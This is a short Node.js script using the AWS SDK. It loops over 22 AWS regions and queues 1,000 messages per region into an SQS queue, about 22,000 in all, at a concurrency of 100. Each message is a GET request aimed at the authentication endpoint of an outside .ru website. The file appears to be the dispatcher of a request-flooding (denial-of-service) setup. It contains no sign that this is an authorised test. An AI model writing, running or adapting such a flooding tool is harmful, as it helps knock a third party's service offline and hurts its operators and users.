import AWS from 'aws-sdk';
import pMap from 'p-map';
import {times} from 'lodash';

const REGIONS = [
  'us-east-1',
  'us-east-2',
  'us-west-1',
  'us-west-2',
  'af-south-1',
  'ap-east-1',
  'ap-southeast-3',
  'ap-southeast-1',
  'ap-southeast-2',
  'ap-south-1',
  'ap-northeast-3',
  'ap-northeast-2',
  'ap-northeast-1',
  'ca-central-1',
  'eu-central-1',
  'eu-west-1',
  'eu-west-2',
  'eu-west-3',
  'eu-south-1',
  'eu-north-1',
  'me-south-1',
  'sa-east-1',
];

const payload = {
  url: `https://my.crb-dnr.ru/rich/auth`,
  method: 'GET',
};

(async () => {
  for (const region of REGIONS) {
    const sqs = new AWS.SQS({region});

    await pMap(
      times(1000),
      async () => {
        await sqs
          .sendMessage({
            QueueUrl: `https://sqs.us-east-1.amazonaws.com/${process.env.AWS_ACC_ID}/requests`,
            MessageBody: JSON.stringify(payload),
          })
          .promise();
      },
      {concurrency: 100, stopOnError: false}
    );

    console.log(`${region}: dispatched`);
  }

  process.exit(0);
})();
